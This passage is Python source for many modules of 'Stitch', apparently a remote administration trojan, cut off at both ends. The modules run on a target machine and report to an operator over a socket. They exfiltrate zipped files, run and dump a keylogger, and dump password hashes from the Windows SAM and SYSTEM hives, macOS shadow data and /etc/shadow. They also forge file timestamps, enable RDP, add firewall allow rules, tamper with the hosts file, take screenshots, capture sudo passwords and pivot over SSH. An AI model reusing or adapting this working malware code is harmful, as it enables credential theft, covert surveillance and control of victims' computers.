# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
import zipfile

if win_client():
    temp = 'C:\\Windows\\Temp\\'
else:
    temp = '/tmp/'
cur_dir = os.getcwd()
content = ''
d_file = receive(client_socket)
if temp in d_file:
    if os.path.exists(d_file):
        os.chdir(temp)
        d_file = os.path.basename(d_file)

d_file = d_file.strip('\\/')
d_zip = ''
d_zpath = ''

if os.path.exists(d_file):
    if os.path.isdir(d_file):
        d_zip = '{}.zip'.format(d_file)
        d_zpath = os.path.join(temp,d_zip)
        zipf = zipfile.ZipFile(d_zpath, 'w', zipfile.ZIP_DEFLATED)
        zipdir(d_file,zipf)
        zipf.close()
    else:
        if '.' in d_file and not d_file.startswith('.'):
            extension = d_file.index('.')
            d_base = d_file[:extension]
            d_zip = '{}.zip'.format(d_base)
        else:
            d_zip = '{}.zip'.format(d_file)
        d_zpath = os.path.join(temp,d_zip)
        zipf = zipfile.ZipFile(d_zpath, 'w', zipfile.ZIP_DEFLATED)
        zipf.write(d_file)
        zipf.close()
    d_size = os.stat(d_zpath)
    send(client_socket, str(d_size.st_size))
    with open (d_zpath, 'rb') as download:
        line = download.read(1024)
        while line:
            send(client_socket,line)
            line = download.read(1024)
    send(client_socket,'download complete')
    os.remove(d_zpath)
else:
    err = "ERROR: could not find {}".format(d_file)
    send(client_socket,err)
os.chdir(cur_dir)

```

`PyLib/drive_finder.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
# heavily based on http://stackoverflow.com/questions/17028221/how-do-i-search-for-a-file-only-on-usb-flash-drives

import sys
import ctypes

# Drive types
DRIVE_UNKNOWN     = 0  # The drive type cannot be determined.
DRIVE_NO_ROOT_DIR = 1  # The root path is invalid; for example, there is no volume mounted at the specified path.
DRIVE_REMOVABLE   = 2  # The drive has removable media; for example, a floppy drive, thumb drive, or flash card reader.
DRIVE_FIXED       = 3  # The drive has fixed media; for example, a hard disk drive or flash drive.
DRIVE_REMOTE      = 4  # The drive is a remote (network) drive.
DRIVE_CDROM       = 5  # The drive is a CD-ROM drive.
DRIVE_RAMDISK     = 6  # The drive is a RAM disk.

# Map drive types to strings
DRIVE_TYPE_MAP = { DRIVE_UNKNOWN     : 'DRIVE_UNKNOWN',
                   DRIVE_NO_ROOT_DIR : 'DRIVE_NO_ROOT_DIR',
                   DRIVE_REMOVABLE   : 'DRIVE_REMOVABLE',
                   DRIVE_FIXED       : 'DRIVE_FIXED',
                   DRIVE_REMOTE      : 'DRIVE_REMOTE',
                   DRIVE_CDROM       : 'DRIVE_CDROM',
                   DRIVE_RAMDISK     : 'DRIVE_RAMDISK'}

kernel32 = ctypes.windll.kernel32
volumeNameBuffer = ctypes.create_unicode_buffer(1024)
fileSystemNameBuffer = ctypes.create_unicode_buffer(1024)
drives = []
bitmask = kernel32.GetLogicalDrives()
letter = ord('A')
while bitmask > 0:
    if bitmask & 1:
        drives.append(chr(letter) + ':\\')
    bitmask >>= 1
    letter += 1
serial_number = None
max_component_length = None
file_system_flags = None

summary = ''
for d in drives:
    drive_type = kernel32.GetDriveTypeA('%s\\' % d)
    rc = kernel32.GetVolumeInformationW(
        ctypes.c_wchar_p(d),
        volumeNameBuffer,
        ctypes.sizeof(volumeNameBuffer),
        serial_number,
        max_component_length,
        file_system_flags,
        fileSystemNameBuffer,
        ctypes.sizeof(fileSystemNameBuffer)
    )
    summary += d
    summary += '\n===='
    summary += "\nFile Type\t:{}".format(fileSystemNameBuffer.value)
    summary += "\nDrive Type\t:{}\n\n".format(DRIVE_TYPE_MAP[drive_type])
send(client_socket, summary)

```

`PyLib/editAccessed.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import subprocess

editfile = receive(client_socket)
edittime = receive(client_socket)
if os.path.exists(editfile):
    cmd ='powershell "Get-ChildItem \'%s\' | %% { $_.LastAccessTime = \'%s\' }"' % (editfile,edittime)
    resp = run_command(cmd)
else:
    resp = "[!] {}: No such file or directory\n".format(editfile)
send(client_socket,resp)

```

`PyLib/editCreation.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import subprocess

editfile = receive(client_socket)
edittime = receive(client_socket)
if os.path.exists(editfile):
    cmd ='powershell "Get-ChildItem \'%s\' | %% { $_.CreationTime = \'%s\' }"' % (editfile,edittime)
    resp = run_command(cmd)
else:
    resp = "[!] {}: No such file or directory\n".format(editfile)
send(client_socket,resp)

```

`PyLib/editModified.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import subprocess

editfile = receive(client_socket)
edittime = receive(client_socket)
if os.path.exists(editfile):
    cmd ='powershell "Get-ChildItem \'%s\' | %% { $_.LastWriteTime = \'%s\' }"' % (editfile,edittime)
    resp = run_command(cmd)
else:
    resp = "[!] {}: No such file or directory\n".format(editfile)
send(client_socket,resp)

```

`PyLib/enableRDP.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import sys
import _winreg
import subprocess

def enable_rdp():
    return run_command('reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')

def check_rdp():
    rdp_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Control\\Terminal Server')
    val=_winreg.QueryValueEx(rdp_key, "fDenyTSConnections")
    if val[0] == 0:
        return True
    else:
        return False

if not check_rdp():
    enable_rdp()
    if check_rdp():
        send(client_socket, "[+] RDP is now Enabled\n")
    else:
        send(client_socket, "[!] Failed to enable RDP, RDP is still Disabled\n")
else:
    send(client_socket, "[*] RDP is already Enabled\n")

```

`PyLib/enableUAC.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import sys
import _winreg
import subprocess

def enable_uac():
    return run_command("REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f")

def check_uac():
    uac_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
    val=_winreg.QueryValueEx(uac_key, "EnableLUA")
    if val[0] == 1:
        return True
    else:
        return False

if not check_uac():
    enable_uac()
    if check_uac():
        send(client_socket, "[+] UAC is now Enabled\n")
    else:
        send(client_socket, "[!] Failed to enable UAC, UAC is still Disabled\n")
else:
    send(client_socket, "[*] UAC is already Enabled\n")

```

`PyLib/enableWinDef.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

def windefnd_scan():
    defender = reg_exists('SOFTWARE\\Microsoft\\Windows Defender')
    if not defender: defender = reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    if not defender: return False
    else: return True

def windefnd_running():
    key = False
    if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Microsoft\\Windows Defender')
    if key:
        try:
            val=_winreg.QueryValueEx(key, "DisableAntiSpyware")
            if val[0] == 1:
                return False
            else:
                return True
        except:
            return False

def enable_windef():
    if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
        return run_command('REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f')
    elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
        return run_command('REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f')


if windefnd_scan():
    if not windefnd_running():
        enable_windef()
        if windefnd_running():
            resp = "[+] Windows Defender is now enabled.\n"
        else:
            resp = "[!] Failed to enable Windows Defender.\n"
    else:
        resp = "[*] Windows Defender is already enabled.\n"
else:
    resp = "[*] Windows Defender not detected on the system.\n"
send(client_socket,resp)

```

`PyLib/environment.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os

resp = ''
for n in os.environ:
    resp += "    {0:35}: {1}\n\n".format(n,os.environ.get(n))
resp = resp.replace(';','\n{0:39}: '.format(""))
send(client_socket,resp)

```

`PyLib/fileinfo.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
import math
import datetime

#http://stackoverflow.com/questions/5194057/better-way-to-convert-file-sizes-in-python
def convertSize(size):
   if (size == 0):
       return '0 Bytes'
   size_name = ("Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
   i = int(math.floor(math.log(size,1024)))
   p = math.pow(1024,i)
   s = round(size/p,2)
   return '{} {}'.format(s,size_name[i])

#http://stackoverflow.com/questions/1392413/calculating-a-directory-size-using-python
def get_dir_size(start_path = '.'):
    total_size = 0
    for dirpath, dirnames, filenames in os.walk(start_path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            total_size += os.path.getsize(fp)
    return total_size

def get_time_date(t):
    return datetime.datetime.fromtimestamp(t)

infofile = receive(client_socket)
if os.path.exists(infofile):
    path = os.path.abspath(infofile)
    if os.path.isdir(infofile):
        total_size = get_dir_size(infofile)
    else:
        total_size = os.stat(infofile).st_size
    size = convertSize(total_size)
    uid = os.stat(infofile).st_uid
    modified = get_time_date(os.path.getmtime(infofile))
    accessed = get_time_date(os.path.getatime(infofile))
    if win_client():
        created = get_time_date(os.path.getctime(infofile))
    if osx_client():
        try:
            created = get_time_date(os.stat(infofile).st_birthtime)
        except Exception as e:
            created = get_time_date(os.path.getctime(infofile))
            pass
    if lnx_client():
        created = get_time_date(os.stat(infofile).st_mtime)

    resp = 'Location{6:10}: {0}\n\nSize{6:14}: {1} ({2} bytes)\n\nCreated{6:11}: {3}\n'\
            'Modified{6:10}: {4}\nAccessed{6:10}: {5}\n'.format(path,size,total_size,
                                                    created,modified,accessed, " ")

else:
    resp = "[!] {}: No such file or directory\n".format(infofile)
send(client_socket,resp)

```

`PyLib/freeze_start.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

nt_kl.stop()
status = nt_kl.get_frz_status()
if status:
    resp = '[+] System is already frozen\n'
else:
    nt_kl.start_freeze()
    status = nt_kl.get_frz_status()
    if status:
        resp = '[+] System is now frozen\n'
    else:
        resp = '[!] System failed to freeze\n'

send(client_socket,resp)

```

`PyLib/freeze_status.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

status = nt_kl.get_frz_status()
if status:
    resp = '[+] System is currently frozen\n'
else:
    resp = '[+] System is not frozen\n'

send(client_socket,resp)

```

`PyLib/freeze_stop.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

status = nt_kl.get_frz_status()
if not status:
    resp = '[+] System is already unfrozen\n'
else:
    nt_kl.stop_freeze()
    status = nt_kl.get_frz_status()
    if not status:
        resp = '[+] System has been successfully unfrozen\n'
    else:
        resp = '[!] System failed to unfreeze\n'

send(client_socket,resp)

```

`PyLib/fwallow.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

ext = ['.jar','.py','.exe','.application','.msi','.msc','.bat','.cmd'\
        ,'.vb','.vbs','.vbe','.js','.jse','wse','.ws','.wsc','.ps1','.ps2'\
        ,'.msh','.msh1','.msh2','.mshxml','.lnk']

allow = receive(client_socket)
rule = receive(client_socket)
if allow.endswith(tuple(ext)):
    if os.path.exists(allow):
        path = os.path.abspath(allow)
        cmd = 'netsh advfirewall firewall add rule name="{}" dir=in action=allow program="{}" enable=yes'.format(rule,path)
        resp = run_command(cmd)
        if "Ok." in resp:
            resp = "[+] Command successfully executed\n"
    else:
        resp = '[!] Path to "{}" could not be found\n'.format(allow)
else:
    resp = '[!] "{}" is not a valid program\n'.format(allow)

send(client_socket,resp)

```

`PyLib/fwscan.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

def checklocalfw():
    print("Getting Windows Built in Firewall configuration...")
    fw = subprocess.Popen('netsh advfirewall show all state',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    fw_mode, errors = fw.communicate()
    if not errors and fw_mode:
        return fw_mode
    else:
        return errros

print checklocalfw()

```

`PyLib/fwstatus.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

if win_client():
    resp=run_command('netsh firewall show state')
if osx_client():
    resp = run_command('/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate')
    resp += run_command('/usr/libexec/ApplicationFirewall/socketfilterfw --getstealthmode')

send(client_socket,resp)

```

`PyLib/get_path.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os

no_error = True
posdir = '/\n'
windir = '\\\n'
complete = os.listdir('.')
c = ''
for n in complete:
    if os.path.isdir(n):
        if sys.platform.startswith('win'):
            c += '%s%s' %(n,windir)
        else:
            c += '%s%s' %(n,posdir)
    else:
        c += '%s\n' %n
send(client_socket, c)
path = get_path()
send(client_socket,path)

```

`PyLib/hashdump.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

def win_cleanup(h_temp):
    if os.path.exists(h_temp):
        shutil.rmtree(h_temp)

def windows_hashdump(sam_h,sys_h,hashtmp):
    if not os.path.exists(hashtmp):
        os.mkdir(hashtmp)

    sam = run_command('REG SAVE HKLM\\SAM {}'.format(sam_h))
    sys = run_command('REG SAVE HKLM\\SYSTEM {}'.format(sys_h))

    s = 'The operation completed successfully'
    if s in sam and s in sys:
        return "[+] Successfully saved SAM and SYSTEM registry hives.", True
    else:
        if s not in sam:
            return "[!] {}".format(sam), False
        if s not in sys:
            return "[!] {}".format(sys), False

if win_client():
    hashtmp = 'C:\\Windows\\Temp\\ST_9626N.tmp'
    sam_hive = 'C:\\Windows\\Temp\\ST_9626N.tmp\\cab_626_2'
    system_hive = 'C:\\Windows\\Temp\\ST_9626N.tmp\\cab_626_3'
    win_cleanup(hashtmp)
    resp, dump = windows_hashdump(sam_hive,system_hive,hashtmp)
    send(client_socket,resp)
    if dump:
        dump_notice ='[*] Attempting to dump hashes...'
        send(client_socket,dump_notice)
        pw_hashes = dump_file_hashes(system_hive,sam_hive)
        send(client_socket,pw_hashes)
        win_cleanup(hashtmp)
if osx_client():
    pw_hashes = ''
    success = False
    osx_ignore = ['daemon','root','nobody']
    users = run_command("dscl . list /Users | grep -v '^_'")
    users = users.split()
    for u in users:
        if u not in osx_ignore:
            cmd = 'defaults read "/var/db/dslocal/nodes/Default/users/{}.plist" ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o - '.format(u)
            resp = run_command(cmd)
            if no_error(resp):
                pw_hashes += 'User: {}\n{}\n\n'.format(u,resp)
                success = True
    if success:
        send(client_socket,pw_hashes)
    else:
        err = '[!] Unable to dump password hashes.\n'
        send(client_socket, err)
if lnx_client():
    err = '[!] Unable to dump password hashes.\n'
    resp = run_command('cat /etc/passwd')
    if no_error(resp):
        send(client_socket, resp)
        resp2 = run_command('cat /etc/shadow')
        if no_error(resp2):
            send(client_socket, resp2)
        else:
            send(client_socket, err)
    else:
        send(client_socket, err)

```

`PyLib/hide.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

f_name = receive(client_socket)
system = sys.platform
if os.path.exists(f_name):
    if win_client():
        resp = run_command("attrib +H {}".format(f_name))
    if osx_client():
        resp = run_command("chflags hidden {}".format(f_name))
    if lnx_client() and f_name.startswith('.') :
        resp = '[*] File is already hidden.\n'
    elif lnx_client():
        resp = run_command("mv {} .{}".format(f_name,f_name))
else:
    if lnx_client():
        if os.path.exists(".{}".format(f_name)):
            resp = '[*] File is already hidden.\n'
    else:
        resp = "[!] {}: No such file or directory\n".format(f_name)
send(client_socket,resp)

```

`PyLib/hostsremove.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

system = sys.platform
if win_client():
    hosts_file = 'C:\\Windows\\System32\\drivers\\etc\\hosts'
else:
    hosts_file = '/etc/hosts'

def host_exists(hostname,hosts):
    with open(hosts, 'rb') as h:
        for line in h:
            if hostname in line:
                return True
    return False

def remove_host(hostname,hosts):
    old_line = ''
    new_hosts = ''
    try:
        with open(hosts, 'r') as h:
            data = h.readlines()
        for index, n in enumerate(data):
            if hostname in n:
                data[index] = '\n'
                try:
                    if data[index-1] == '\n':
                        data[index-1] =""
                    if data[index+1] == '\n':
                        data[index+1] =""
                except IndexError: pass
        for n in data:
            new_hosts += n
        new_hosts = "{}\n".format(new_hosts.strip('\n'))
        with open(hosts, 'wb') as h:
            h.writelines(new_hosts)
        return True,None
    except Exception as e:
        return False,str(e)

hostname = receive(client_socket)

if host_exists(hostname,hosts_file):
    success, err = remove_host(hostname,hosts_file)
    if success and not err:
        resp = '[+] Successfully removed "{}" from {}\n'.format(hostname,hosts_file)
    else:
        resp = '[!] ERROR: {}\n'.format(err)
else:
    resp = '[*] Hostname "{}" was not found in the hosts file.\n'.format(hostname)
send(client_socket,resp)

```

`PyLib/hostsupdate.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
# Based heavily off of Jason Vanzin:
# https://github.com/jasonvanzin/hostfileupdate/blob/master/hostfileupdate.py

system = sys.platform
if win_client():
    hosts_file = 'C:\\Windows\\System32\\drivers\\etc\\hosts'
else:
    hosts_file = '/etc/hosts'

def host_exists(hostname,hosts):
    with open(hosts, 'rb') as h:
        for line in h:
            if hostname in line:
                return True
    return False

def add_host(host_entry,hosts):
    try:
        with open(hosts, 'a') as h:
            h.write(host_entry)
        return True,None
    except Exception as e:
        return False,str(e)

def update_host(hostname,host_entry,hosts):
    old_line = ''
    try:
        with open(hosts, 'rb') as h:
            data = h.readlines()
        for index, n in enumerate(data):
            if n.strip().endswith(hostname):
                data[index] = host_entry
                break
        with open(hosts, 'wb') as h:
            h.writelines(data)
        return True,None
    except Exception as e:
        return False,str(e)

def validateIP(ipaddress):
    parts = ipaddress.split(".")
    if len(parts) != 4: return False
    if ipaddress[-1] == '.': return False
    for item in parts:
        if not 0 <= int(item) <= 255:
            return False
    return True

def validateHostname(hostname):
    if len(hostname) > 255 or len(hostname) < 5: return False
    if hostname[0].isdigit(): return False
    if hostname[-1:] == ".": hostname = hostname[:-1]
    allowed = re.compile("(?!-)[A-Z\d-]{1,63}(?<!-)$", re.IGNORECASE)
    return all(allowed.match(x) for x in hostname.split("."))

hostname = receive(client_socket)
ipaddress = receive(client_socket)
entry = "\n{0:20}{1}\n".format(ipaddress, hostname)
entry_update = "{0:20}{1}\n".format(ipaddress, hostname)

if not validateIP(ipaddress):
    resp = '[!] "{}" is not a valid IP address.\n'.format(ipaddress)
elif not validateHostname(hostname):
    resp = '[!] "{}" is not a valid hostname.\n'.format(hostname)
elif host_exists(hostname,hosts_file):
    success, err = update_host(hostname,entry_update,hosts_file)
    if success and not err:
        resp = '[+] Successfully updated "{}" to {}\n'.format(hostname,ipaddress)
    else:
        resp = '[!] ERROR: {}\n'.format(err)
else:
    success, err = add_host(entry,hosts_file)
    if success and not err:
        resp = '[+] Successfully added "{}" to "{}"\n'.format(hostname,hosts_file)
    else:
        resp = '[!] ERROR: {}\n'.format(err)
send(client_socket,resp)

```

`PyLib/kl_dump.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

resp = "{}\n\n".format(nt_kl.get_dump())
send(client_socket,resp)

```

`PyLib/kl_start.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

if win_client():
    nt_kl.stop_freeze()
status = nt_kl.get_status()
if status:
    resp = '[+] Keylogger is already running\n'
else:
    nt_kl.start()
    status = nt_kl.get_status()
    if status:
        resp = '[+] Keylogger is now running\n'
    else:
        resp = '[!] Keylogger failed to start\n'

send(client_socket,resp)

```

`PyLib/kl_status.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

status = nt_kl.get_status()
if status:
    resp = '[+] Keylogger is active\n'
else:
    resp = '[+] Keylogger is inactive\n'

send(client_socket,resp)

```

`PyLib/kl_stop.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

status = nt_kl.get_status()
if not status:
    resp = '[+] Keylogger is already inactive\n'
else:
    nt_kl.stop()
    status = nt_kl.get_status()
    if not status:
        resp = '[+] Keylogger has been successfully stopped\n'
    else:
        resp = '[!] Keylogger failed to stop\n'

send(client_socket,resp)

```

`PyLib/location.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import requests
from time import strftime, sleep

try:
    ip = requests.request('GET','https://api.ipify.org').text
except Exception as e:
    resp = '[!] Unable to obtain public ip address\n'
    send(client_socket,resp)
else:
    try:
        url = 'http://freegeoip.net/json/{}'.format(ip)
        r = requests.get(url)
        js = r.json()

        ctry_code = js['country_code']
        ctry_name = js['country_name']
        regn_name = js['region_name']
        t_zone = js['time_zone']
        city = js['city']
        lat = js['latitude']
        log = js['longitude']
        zipcode = js['zip_code']
        metro = js['metro_code']
        hour = int(strftime("%H"))
        am_pm = "AM"
        if hour > 12:
            hour = str(hour - 12)
            am_pm = "PM"
        time = "{}{}{}".format(str(hour),strftime(":%M:%S "),am_pm)
        date = strftime("%m/%d/%Y")
        resp =('    Public IP\t\t: {}\n\
                \n    Country\t\t: {}, {}\
                \n    Region\t\t: {}\
                \n    City\t\t: {}\
                \n    Postal code\t\t: {}\
                \n    Lat/Long\t\t: {}, {}\
                \n    Metro Code\t\t: {}\n\
                \n    Date\t\t: {}\
                \n    Time\t\t: {}\
                \n    Time zone\t\t: {}\n').format(ip,ctry_name,ctry_code,\
        regn_name,city,zipcode,lat,log,metro,date,time,t_zone)
        send(client_socket,resp)
    except Exception as e:
        resp = '[!] Unable to obtain physical location information\n'
        send(client_socket,resp)

```

`PyLib/lockscreen.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import ctypes

if win_client():
    success = "[+] Command successfully executed.\n"
    ctypes.windll.user32.LockWorkStation()
    send(client_socket,success)
if osx_client():
    resp=run_command('/System/Library/CoreServices/"Menu Extras"/User.menu/Contents/Resources/CGSession -suspend')
    send(client_socket,resp)
if lnx_client():
    resp=run_command('vlock -a -s')
    send(client_socket,resp)

```

`PyLib/popup.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import ctypes

if win_client():
    message=receive(client_socket)
    cmd = 'powershell "(new-object -ComObject wscript.shell).Popup(\\"{}\\",0,\\"Windows\\")"'.format(message)
    start_command(cmd)
    resp = "[+] Popup window successfully executed\n"
    send(client_socket,resp)
if osx_client():
    message=receive(client_socket)
    cmd = "osascript -e 'tell app \"System Events\" to display dialog \"{}\" buttons {{\"OK\"}} default button \"OK\" '".format(message)
    start_command(cmd)
    resp = "[+] Popup window successfully executed\n"
    send(client_socket,resp)

```

`PyLib/scanReg.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

scansum = ''

def windefnd_scan():
    defender = reg_exists('SOFTWARE\\Microsoft\\Windows Defender')
    if not defender: defender = reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    if not defender: return False
    else: return True

def windefnd_running():
    key = False
    if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Microsoft\\Windows Defender')
    if key:
        try:
            val=_winreg.QueryValueEx(key, "DisableAntiSpyware")
            if val[0] == 1:
                return False
            else:
                return True
        except:
            return False

def check_uac():
    uac_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
    val=_winreg.QueryValueEx(uac_key, "EnableLUA")
    if val[0] == 1:
        return True
    else:
        return False

def check_rdp():
    rdp_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Control\\Terminal Server')
    val=_winreg.QueryValueEx(rdp_key, "fDenyTSConnections")
    if val[0] == 0:
        return True
    else:
        return False

def check_dep():
    dep_mode = run_command('wmic OS get DataExecutionPrevention_SupportPolicy')
    if "0" in dep_mode:
        return "   DEP: OFF for the whole system.\n"
    elif "1" in dep_mode:
        return "   DEP: FULL coverage for the whole system with no exceptions.\n"
    elif "2" in dep_mode:
        return "   DEP: LIMITED to Windows system binaries.\n"
    elif "3" in dep_mode:
        return "   DEP: ON for all programs and services.\n"
    else:
        return dep_mode

if check_uac():
    scansum += '   UAC: ON\n'
else:
    scansum += "   UAC: OFF\n"

if check_rdp():
    scansum += '   RDP: ON\n'
else:
    scansum += '   RDP: OFF\n'

if windefnd_scan():
    if windefnd_running():
        scansum += '   Windows Defender: ON\n'
    else:
        scansum += '   Windows Defender: OFF\n'
else:
    scansum += "   Windows Defender: NOT INSTALLED\n"

scansum += check_dep()


send(client_socket,scansum)

```

`PyLib/screenshot.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
from os import rename
from os.path import isfile
from mss import ScreenshotError

temp = get_temp()

o = os.path.join(temp,'fs.jpg')
try:
    with MSS() as screenshotter:
        if osx_client():
            result=run_command('screencapture -x {}'.format(o))
            if not no_error(result):
                screenshotter.max_displays = 32
                next(screenshotter.save(mon=-1, output=o))
        else:
            #print("\nA screenshot to grab them all")
            next(screenshotter.save(mon=-1, output=o))
        send(client_socket,'[+] Screenshot has been taken!')
except ScreenshotError as ex:
    err = "ERROR: {}".format(ex)
    send(client_socket,err)

```

`PyLib/ssh.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import pexpect.pxssh

def run_ssh_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    return str(s.before)

def ssh_connect(host, user, password):
    try:
        s = pexpect.pxssh.pxssh()
        s.login(host, user, password)
        return s, True
    except Exception as e:
        return '[!] SSH Failure: {}'.format(str(e)), False

ssh_user = receive(client_socket)
ssh_hostname = receive(client_socket)
ssh_password = receive(client_socket)

s, success = ssh_connect(ssh_hostname, ssh_user, ssh_password)
if success:
    prompt = "{}@{}>> ".format(ssh_user,ssh_hostname)
    send(client_socket, prompt)
    while True:
        ssh_cmd = receive(client_socket)
        if ssh_cmd.startswith('exit'): break
        ssh_resp = run_ssh_command(s, ssh_cmd.strip())
        send(client_socket,ssh_resp)
    s.logout()
else:
    send(client_socket,s)

```

`PyLib/sudo_cmd.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
import socket
import pexpect
import subprocess

cmd = receive(client_socket)
check = cmd
child = pexpect.spawn('sudo {}'.format(cmd))
passw = ['Password.*:','.*password.*:']
try:
    child.expect(passw,timeout=2)
except Exception as e:
    child.close
    cmd = run_command("sudo {}".format(cmd))
    send(client_socket,'sudo_success')
    send(client_socket,cmd)

if cmd == check:
    try:
        failure = ['.*try again.*assword.*:','.*try again.*sudo: 3 incorrect password attempts.*']
        send(client_socket,'Please enter sudo password:')
        p = receive(client_socket)
        child.sendline(p)
        i = child.expect(failure, timeout=2)
        while i == 0:
            send(client_socket,'Sorry incorrect\nPlease enter sudo password:')
            p = receive(client_socket)
            child.sendline(p)
            i = child.expect(failure, timeout=2)
        if i == 1:
            send(client_socket,'sudo: 3 incorrect password attempts')
    except Exception as e:
        cmd = child.before
        send(client_socket,'sudo_success')
        send(client_socket,cmd)

child.close

```

`PyLib/sysinfo.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import ctypes
import socket
import platform
import subprocess
from time import strftime, sleep

hour = int(strftime("%H"))
am_pm = "AM"
if hour > 12:
    hour = str(hour - 12)
    am_pm = "PM"
try:
